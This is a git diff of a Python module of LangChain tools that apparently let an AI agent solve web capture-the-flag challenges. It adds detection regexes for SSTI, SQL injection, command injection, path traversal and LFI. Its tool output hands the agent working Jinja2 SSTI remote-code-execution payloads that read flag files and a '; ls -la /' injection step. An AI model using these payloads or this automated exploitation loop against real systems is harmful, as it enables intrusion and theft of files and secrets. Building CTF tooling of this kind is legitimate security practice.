@@ -1,5 +1,6 @@
 """LangChain tools for browser automation in CTF challenges."""
 
+import re
 from typing import TYPE_CHECKING
 
 from langchain_core.tools import tool
@@ -14,7 +15,7 @@ from .extractors import (
 from .payloads import get_payloads
 from ..config import get_settings
 from ..utils.flag_detector import detect_flag_in_page
-from ..utils.logger import log_action, log_observation, log_error
+from ..utils.logger import log_action, log_observation, log_error, _log_to_file
 from ..utils.hitl import request_human_input
 from ..models.vision import analyze_ctf_page
 
@@ -24,11 +25,15 @@ if TYPE_CHECKING:
 # Global browser controller reference (set by orchestrator)
 _browser: "BrowserController | None" = None
 
+# Track which payload types have been run to prevent loops
+_executed_payload_types: set[str] = set()
+
 
 def set_browser_controller(browser: "BrowserController") -> None:
     """Set the global browser controller for tools."""
-    global _browser
+    global _browser, _executed_payload_types
     _browser = browser
+    _executed_payload_types = set()  # Reset on new session
 
 
 def get_browser() -> "BrowserController":
@@ -36,6 +41,12 @@ def get_browser() -> "BrowserController":
     if _browser is None:
         raise RuntimeError("Browser controller not initialized")
     return _browser
+
+
+def reset_payload_tracking() -> None:
+    """Reset the executed payload types tracking."""
+    global _executed_payload_types
+    _executed_payload_types = set()
 
 
 @tool
@@ -406,27 +417,351 @@ async def request_human_help(reason: str) -> str:
     return f"Human guidance: {response}"
 
 
+def _analyze_payload_response(payload: str, payload_type: str, html: str, original_html: str) -> dict:
+    """
+    Analyze the response after a payload to detect interesting patterns.
+
+    Returns a dict with:
+        - interesting: bool - whether this response is worth noting
+        - critical: bool - whether this is critical enough to stop iteration
+        - findings: list[str] - what was found
+        - response_snippet: str - relevant part of the response
+    """
+    findings = []
+    interesting = False
+    critical = False
+    response_snippet = ""
+
+    # Get the body text (strip HTML tags for cleaner analysis)
+    body_text = re.sub(r'<[^>]+>', ' ', html)
+    body_text = ' '.join(body_text.split())  # Normalize whitespace
+
+    if payload_type == "ssti":
+        # Check for SSTI indicators
+
+        # {{7*7}} should produce 49
+        if "7*7" in payload or "7 * 7" in payload:
+            if "49" in html and "49" not in original_html:
+                findings.append("SSTI CONFIRMED: {{7*7}} evaluated to 49")
+                interesting = True
+                critical = True
+
+        # Check for config object dumps
+        if "config" in payload.lower():
+            config_patterns = [
+                r"SECRET_KEY",
+                r"DEBUG.*True",
+                r"DATABASE",
+                r"<Config",
+                r"'SECRET'",
+                r"flask\.config",
+            ]
+            for pattern in config_patterns:
+                if re.search(pattern, html, re.IGNORECASE):
+                    findings.append(f"Config leak detected: {pattern}")
+                    interesting = True
+                    critical = True
+                    # Extract snippet around the match
+                    match = re.search(pattern, html, re.IGNORECASE)
+                    if match:
+                        start = max(0, match.start() - 100)
+                        end = min(len(html), match.end() + 200)
+                        response_snippet = html[start:end]
+
+        # Check for class/MRO dumps (Python SSTI)
+        if "__class__" in payload or "__mro__" in payload:
+            if "__class__" in html or "__mro__" in html or "subclasses" in html:
+                findings.append("Python class introspection output detected")
+                interesting = True
+                # Extract the class dump
+                mro_match = re.search(r'\[.*?class.*?\]', html[:2000])
+                if mro_match:
+                    response_snippet = mro_match.group()[:500]
+
+        # Check for command execution output
+        if "popen" in payload.lower() or "system" in payload.lower():
+            # Look for typical command output
+            if re.search(r'uid=\d+|root:|www-data|/bin/|/usr/', html):
+                findings.append("Command execution output detected!")
+                interesting = True
+                critical = True
+
+        # Check for Jinja2/Flask specific errors
+        if re.search(r'jinja2|TemplateSyntaxError|UndefinedError', html, re.IGNORECASE):
+            findings.append("Jinja2 template error detected - confirms SSTI vector")
+            interesting = True
+
+    elif payload_type == "ssti_explore":
+        # For exploration, we want to run ALL payloads to gather info
+        # Only stop (critical=True) if we actually find a flag
+        # Capture ALL useful info to help LLM craft the final payload
+
+        # Directory listing output - extract full listing
+        if re.search(r'total \d+|drwx|^-rw|lrwx', html):
+            findings.append("Directory listing detected!")
+            interesting = True
+            # Extract the directory listing (between template output markers)
+            # Strip HTML and get clean output
+            clean_html = re.sub(r'<[^>]+>', '\n', html)
+            ls_match = re.search(r'(total \d+[\s\S]*?)(?:\n\n|\Z)', clean_html)
+            if ls_match:
+                listing = ls_match.group(1).strip()
+                response_snippet = listing[:800]
+                # Look for flag-related files in listing
+                flag_files = re.findall(r'[\w./-]*flag[\w./-]*', listing, re.IGNORECASE)
+                if flag_files:
+                    findings.append(f"FLAG FILES FOUND: {', '.join(set(flag_files))}")
+
+        # Find command output - extract file paths
+        if 'find' in payload.lower() or 'locate' in payload.lower():
+            # Extract file paths from find output
+            clean_html = re.sub(r'<[^>]+>', '\n', html)
+            file_paths = re.findall(r'(/[\w./-]+)', clean_html)
+            if file_paths:
+                interesting = True
+                # Filter for interesting paths
+                interesting_paths = [p for p in file_paths if 'flag' in p.lower() or '.txt' in p.lower()]
+                if interesting_paths:
+                    unique_paths = list(set(interesting_paths))
+                    findings.append(f"INTERESTING FILES: {', '.join(unique_paths[:10])}")
+                    response_snippet = '\n'.join(unique_paths[:20])
+
+        # File content (flag files often have specific patterns) - ONLY THIS IS CRITICAL
+        if re.search(r'pico|ctf|flag|HTB|THM', html, re.IGNORECASE) and re.search(r'\{[^}]+\}', html):
+            # Extract the actual flag
+            flag_match = re.search(r'((?:pico|ctf|flag|HTB|THM|picoCTF)\{[^}]+\})', html, re.IGNORECASE)
+            if flag_match:
+                findings.append(f"FLAG FOUND: {flag_match.group(1)}")
+                critical = True  # Only stop for actual flag
+            else:
+                findings.append("Possible flag content in response!")
+            interesting = True
+
+        # Environment variables dump - look for FLAG variable specifically
+        if re.search(r'PATH=|HOME=|USER=|FLAG=|SECRET', html):
+            findings.append("Environment variables leaked!")
+            interesting = True
+            # Look specifically for FLAG= in env output
+            flag_env = re.search(r'FLAG=([^\s<]+)', html)
+            if flag_env:
+                findings.append(f"FLAG VARIABLE: {flag_env.group(1)}")
+                critical = True
+            # Extract env vars
+            clean_html = re.sub(r'<[^>]+>', ' ', html)
+            env_match = re.search(r'((?:\w+=\S+\s*){1,20})', clean_html)
+            if env_match and not response_snippet:
+                response_snippet = env_match.group(1)[:500]
+
+        # Config object dump - interesting but don't stop
+        if re.search(r"SECRET_KEY|<Config|'SECRET'", html, re.IGNORECASE):
+            findings.append("Flask config leaked!")
+            interesting = True
+            # NOT critical - keep exploring
+
+        # Command output (id, whoami, pwd, etc.)
+        if re.search(r'uid=\d+|root:|www-data|/bin/bash', html):
+            findings.append("Command execution confirmed!")
+            interesting = True
+
+        # PWD output - capture current directory
+        if 'pwd' in payload.lower():
+            clean_html = re.sub(r'<[^>]+>', ' ', html)
+            pwd_match = re.search(r'(/[\w/-]+)', clean_html)
+            if pwd_match and not response_snippet:
+                findings.append(f"Current directory: {pwd_match.group(1)}")
+                response_snippet = pwd_match.group(1)
+
+        # Check if response changed significantly (command output likely)
+        if len(html) > len(original_html) + 50:
+            findings.append(f"Response grew by {len(html) - len(original_html)} bytes - command executed!")
+            interesting = True
+
+    elif payload_type == "sqli":
+        # Check for SQL errors
+        sql_errors = [
+            r"SQL syntax.*MySQL",
+            r"Warning.*mysql_",
+            r"PostgreSQL.*ERROR",
+            r"ORA-\d{5}",
+            r"Microsoft.*ODBC.*SQL Server",
+            r"sqlite3\.OperationalError",
+            r"You have an error in your SQL syntax",
+            r"Unclosed quotation mark",
+            r"syntax error at or near",
+        ]
+        for pattern in sql_errors:
+            if re.search(pattern, html, re.IGNORECASE):
+                findings.append(f"SQL Error detected: {pattern}")
+                interesting = True
+                critical = True
+
+        # Check for successful injection (data returned)
+        if "UNION" in payload.upper():
+            # Look for multiple rows or unexpected data
+            if re.search(r'admin|root|password|secret|user', html, re.IGNORECASE):
+                findings.append("Possible data leak from UNION injection")
+                interesting = True
+
+        # Check for auth bypass success (page changed significantly)
+        if len(html) > len(original_html) * 1.5:
+            findings.append("Page content significantly increased - possible successful injection")
+            interesting = True
+
+    elif payload_type == "cmdi":
+        # Check for command execution output
+        cmd_indicators = [
+            (r'uid=\d+\(.*?\)', "Unix id command output"),
+            (r'root:.*?:/bin/', "/etc/passwd content"),
+            (r'total \d+.*?drwx', "Directory listing (ls -la)"),
+            (r'Linux.*?\d+\.\d+\.\d+', "uname output"),
+            (r'www-data|apache|nginx', "Web user detected"),
+            (r'flag\{.*?\}', "Flag pattern in output"),
+        ]
+        for pattern, desc in cmd_indicators:
+            if re.search(pattern, html):
+                findings.append(f"Command execution confirmed: {desc}")
+                interesting = True
+                critical = True
+                match = re.search(pattern, html)
+                if match:
+                    start = max(0, match.start() - 50)
+                    end = min(len(html), match.end() + 100)
+                    response_snippet = html[start:end]
+
+    elif payload_type == "path_traversal":
+        # Check for file content indicators
+        file_indicators = [
+            (r'root:.*?:0:0:', "/etc/passwd content"),
+            (r'\$\d+\$.*?\$', "Password hash detected"),
+            (r'<?php', "PHP source code"),
+            (r'DB_PASSWORD|DB_HOST', "Config file content"),
+            (r'flag\{.*?\}|FLAG\{.*?\}', "Flag in file"),
+        ]
+        for pattern, desc in file_indicators:
+            if re.search(pattern, html):
+                findings.append(f"Path traversal successful: {desc}")
+                interesting = True
+                critical = True
+
+    elif payload_type == "lfi":
+        # Check for included file content
+        if "<?php" in html or "<?=" in html:
+            findings.append("PHP source code exposed via LFI")
+            interesting = True
+            critical = True
+        if "base64" in payload and len(html) > len(original_html) + 100:
+            findings.append("Base64 encoded content returned - decode it!")
+            interesting = True
+            # Extract potential base64
+            b64_match = re.search(r'[A-Za-z0-9+/]{50,}={0,2}', html)
+            if b64_match:
+                response_snippet = f"Base64 content: {b64_match.group()[:200]}..."
+
+    # Generic: check if page changed significantly
+    if not findings and len(html) != len(original_html):
+        size_diff = len(html) - len(original_html)
+        if abs(size_diff) > 200:
+            findings.append(f"Page size changed by {size_diff} bytes")
+            interesting = True
+
+    # Generic: check for error messages that might reveal info
+    error_patterns = [
+        r'Exception|Error|Warning|Fatal|Traceback',
+        r'Stack trace|Debug|Internal Server Error',
+    ]
+    for pattern in error_patterns:
+        if re.search(pattern, html) and not re.search(pattern, original_html):
+            findings.append(f"New error/exception appeared in response")
+            interesting = True
+            # Extract error snippet
+            match = re.search(pattern, html)
+            if match and not response_snippet:
+                start = max(0, match.start() - 50)
+                end = min(len(html), match.end() + 300)
+                response_snippet = re.sub(r'<[^>]+>', ' ', html[start:end])
+
+    return {
+        "interesting": interesting,
+        "critical": critical,
+        "findings": findings,
+        "response_snippet": response_snippet[:500] if response_snippet else "",
+    }
+
+
 @tool
 async def try_common_payloads(input_selector: str, payload_type: str) -> str:
-    """Try common CTF payloads on an input field.
+    """Try common CTF payloads on an input field with intelligent response analysis.
+
+    This tool tests payloads and analyzes responses to detect:
+    - SSTI: template evaluation ({{7*7}}=49), config leaks, class dumps
+    - SQLi: SQL errors, data leaks, auth bypass indicators
+    - Command injection: command output, file contents
+    - Path traversal: file contents, source code exposure
+    - LFI: included file content, base64 encoded data
+
+    The tool will stop early if a critical finding is detected (e.g., confirmed SSTI,
+    successful command execution) so you can investigate further.
 
     Args:
         input_selector: CSS selector for the input field to test.
-        payload_type: Type of payload: 'sqli', 'xss', 'cmdi', 'path_traversal', 'ssti', 'lfi', 'auth_bypass'
+        payload_type: Type of payload:
+            - 'ssti': Detection payloads ({{7*7}}, etc.)
+            - 'ssti_explore': Exploration payloads (ls, find, env) - use AFTER confirming SSTI
+            - 'sqli': SQL injection payloads
+            - 'cmdi': Command injection payloads
+            - 'path_traversal': Directory traversal payloads
+            - 'lfi': Local file inclusion payloads
+            - 'xss': Cross-site scripting payloads
+            - 'auth_bypass': Common credentials
 
     Returns:
-        Results of testing each payload.
+        Detailed results including response analysis and any interesting findings.
     """
+    global _executed_payload_types
+
     browser = get_browser()
 
     if not browser.page:
         return "Error: Browser not initialized"
 
+    # Check if this payload type has already been run
+    if payload_type in _executed_payload_types:
+        guidance = f"""
+ERROR: You already ran '{payload_type}' payloads. Do NOT run them again!
+
+You have gathered enough information. Now you must use fill_input to craft your OWN custom payload.
+
+For SSTI exploitation, use fill_input like this:
+  fill_input('{input_selector}', "{{{{lipsum.__globals__['os'].popen('cat /path/to/flag').read()}}}}")
+
+Based on the directory listings and file searches from before, identify where the flag is and read it.
+Common flag locations: /flag.txt, /app/flag, /home/*/flag.txt
+
+DO NOT call try_common_payloads again. Use fill_input with a custom payload NOW.
+"""
+        return guidance
+
+    # Mark this payload type as executed
+    _executed_payload_types.add(payload_type)
+
     payloads = get_payloads(payload_type)
     if not payloads:
-        return f"Unknown payload type: {payload_type}. Available: sqli, xss, cmdi, path_traversal, ssti, lfi, auth_bypass"
+        return f"Unknown payload type: {payload_type}. Available: ssti, ssti_explore, sqli, cmdi, path_traversal, lfi, xss, auth_bypass"
+
+    # Capture original page state for comparison
+    original_html = await browser.get_page_content()
+    original_url = browser.get_current_url()
+
+    # Log start of payload testing
+    _log_to_file("INFO", "PAYLOAD_START", f"Starting {payload_type} payload testing", {
+        "selector": input_selector,
+        "original_url": original_url,
+        "payload_count": len(payloads),
+        "original_html_length": len(original_html),
+    })
 
     results = [f"Testing {len(payloads)} {payload_type} payloads on {input_selector}:\n"]
+    interesting_findings = []
 
     # Test all payloads
     for i, payload in enumerate(payloads, 1):
@@ -440,23 +775,106 @@ async def try_common_payloads(input_selector: str, payload_type: str) -> str:
 
             # Try to submit (press Enter)
             await browser.press_key("Enter")
-            await browser.page.wait_for_timeout(1000)
 
-            # Check for flag
-            html = await browser.get_page_content()
+            # Wait longer for slow commands (find, grep, etc.)
+            if any(cmd in payload.lower() for cmd in ['find', 'grep', 'locate', 'cat']):
+                await browser.page.wait_for_timeout(3000)  # 3 seconds for slow commands
+            else:
+                await browser.page.wait_for_timeout(1500)
+
+            # Wait for page to finish loading
+            try:
+                await browser.page.wait_for_load_state("networkidle", timeout=5000)
+            except Exception:
+                pass  # Continue even if timeout
+
+            # Get response with retry
+            try:
+                html = await browser.get_page_content()
+            except Exception as e:
+                # If content fetch fails, wait and retry
+                await browser.page.wait_for_timeout(1000)
+                try:
+                    html = await browser.get_page_content()
+                except Exception:
+                    html = ""  # Empty if still fails
+
+            url = browser.get_current_url()
+
+            # Check for flag first
             from ..utils.flag_detector import detect_flag
             flag = detect_flag(html)
 
-            url = browser.get_current_url()
-            result = f"  [{i}/{len(payloads)}] Payload: {str(payload)[:50]}"
-            result += f"\n       URL after: {url}"
-
             if flag:
-                result += f"\n       FLAG FOUND: {flag}"
+                result = f"  [{i}/{len(payloads)}] Payload: {str(payload)[:50]}"
+                result += f"\n       *** FLAG FOUND: {flag} ***"
                 results.append(result)
+                _log_to_file("INFO", "FLAG_FOUND_PAYLOAD", f"Flag found with payload: {payload}", {
+                    "flag": flag,
+                    "payload": payload,
+                    "html": html,
+                })
                 return "\n".join(results) + f"\n\n*** FLAG FOUND: {flag} ***"
 
+            # Log full response to file (untruncated for debugging)
+            _log_to_file("DEBUG", "PAYLOAD_RESPONSE", f"Payload [{i}/{len(payloads)}]: {payload}", {
+                "payload_type": payload_type,
+                "selector": input_selector,
+                "url": url,
+                "html_length": len(html),
+                "html_content": html,  # Full HTML - untruncated
+            })
+
+            # Analyze the response
+            analysis = _analyze_payload_response(payload, payload_type, html, original_html)
+
+            # Log analysis results
+            _log_to_file("DEBUG", "PAYLOAD_ANALYSIS", f"Analysis for payload: {payload}", {
+                "interesting": analysis["interesting"],
+                "critical": analysis["critical"],
+                "findings": analysis["findings"],
+                "response_snippet": analysis["response_snippet"],
+            })
+
+            # Build result string
+            result = f"  [{i}/{len(payloads)}] Payload: {str(payload)[:50]}"
+            result += f"\n       URL: {url}"
+
+            if analysis["findings"]:
+                result += f"\n       >>> FINDINGS:"
+                for finding in analysis["findings"]:
+                    result += f"\n           - {finding}"
+                interesting_findings.append({
+                    "payload": str(payload),
+                    "findings": analysis["findings"],
+                    "snippet": analysis["response_snippet"],
+                })
+
+            if analysis["response_snippet"]:
+                result += f"\n       Response snippet: {analysis['response_snippet'][:200]}..."
+
             results.append(result)
+
+            # If critical finding, stop and report
+            if analysis["critical"]:
+                results.append(f"\n{'='*60}")
+                results.append(f"VULNERABILITY CONFIRMED! DO NOT run detection payloads again!")
+                results.append(f"{'='*60}")
+                if payload_type == "ssti":
+                    results.append(f"\nNEXT ACTION: Use fill_input with this SSTI RCE payload:")
+                    results.append(f"  fill_input('#announce', \"{{{{lipsum.__globals__['os'].popen('ls -la /').read()}}}}\")")
+                    results.append(f"\nThis will list files at root. Then based on what you see, use fill_input")
+                    results.append(f"to cat the flag file (e.g., cat /flag.txt)")
+                elif payload_type == "sqli":
+                    results.append(f"\nNEXT ACTION: Use fill_input with UNION SELECT to extract data")
+                elif payload_type == "cmdi":
+                    results.append(f"\nNEXT ACTION: Use fill_input with: ; ls -la / to explore")
+
+                # Navigate back so agent can continue exploiting
+                await browser.go_back()
+                await browser.page.wait_for_timeout(500)
+                results.append(f"\nReady at: {browser.get_current_url()}")
+                break
 
             # Go back for next payload
             await browser.go_back()
@@ -464,8 +882,72 @@ async def try_common_payloads(input_selector: str, payload_type: str) -> str:
 
         except Exception as e:
             results.append(f"  [{i}/{len(payloads)}] Payload {str(payload)[:30]}... Error: {e}")
+            # Try to recover by navigating back to original page
+            try:
+                await browser.navigate(original_url)
+                await browser.page.wait_for_timeout(500)
+            except Exception:
+                pass  # If recovery fails, continue anyway
 
-    return "\n".join(results)
+    # Summary of interesting findings
+    if interesting_findings:
+        results.append(f"\n{'='*60}")
+        results.append(f"EXPLORATION COMPLETE: {len(interesting_findings)} findings")
+        results.append(f"{'='*60}")
+
+        # Collect all discovered flag-related paths
+        flag_paths = []
+        all_snippets = []
+
+        for idx, finding in enumerate(interesting_findings, 1):
+            results.append(f"\n{idx}. {finding['payload'][:50]}...")
+            for f in finding["findings"]:
+                results.append(f"   → {f}")
+                # Extract flag paths from findings
+                if "FLAG FILES" in f or "INTERESTING FILES" in f:
+                    paths = re.findall(r'/[\w./-]+', f)
+                    flag_paths.extend(paths)
+            if finding["snippet"]:
+                all_snippets.append(finding["snippet"])
+                results.append(f"   Output: {finding['snippet'][:400]}")
+
+        # Provide specific exploitation guidance
+        if payload_type == "ssti_explore":
+            results.append(f"\n{'='*60}")
+            results.append("YOUR TURN: Use fill_input to read the flag!")
+            results.append(f"{'='*60}")
+
+            if flag_paths:
+                # Suggest specific cat commands for discovered flag files
+                unique_paths = list(set(flag_paths))[:5]
+                results.append(f"\nDiscovered flag-related files: {', '.join(unique_paths)}")
+                results.append("\nTry these commands with fill_input:")
+                for path in unique_paths:
+                    results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat {path}').read()}}}}\")")
+            else:
+                results.append("\nNo specific flag files found. Try:")
+                results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}}}\")")
+                results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /app/flag').read()}}}}\")")
+                results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /flag').read()}}}}\")")
+
+            results.append("\nDO NOT run try_common_payloads again. Use fill_input NOW!")
+    else:
+        results.append(f"\n=== No significant findings detected ===")
+        if payload_type == "ssti_explore":
+            results.append("Try alternative RCE methods with fill_input:")
+            results.append(f"  fill_input('{input_selector}', \"{{{{cycler.__init__.__globals__.os.popen('ls -la /').read()}}}}\")")
+            results.append(f"  fill_input('{input_selector}', \"{{{{joiner.__init__.__globals__.os.popen('ls -la /').read()}}}}\")")
+
+    # Log final summary
+    final_result = "\n".join(results)
+    _log_to_file("INFO", "PAYLOAD_COMPLETE", f"Completed {payload_type} payload testing", {
+        "selector": input_selector,
+        "findings_count": len(interesting_findings),
+        "interesting_findings": interesting_findings,
+        "full_result": final_result,
+    })
+
+    return final_result
 
 
 @tool
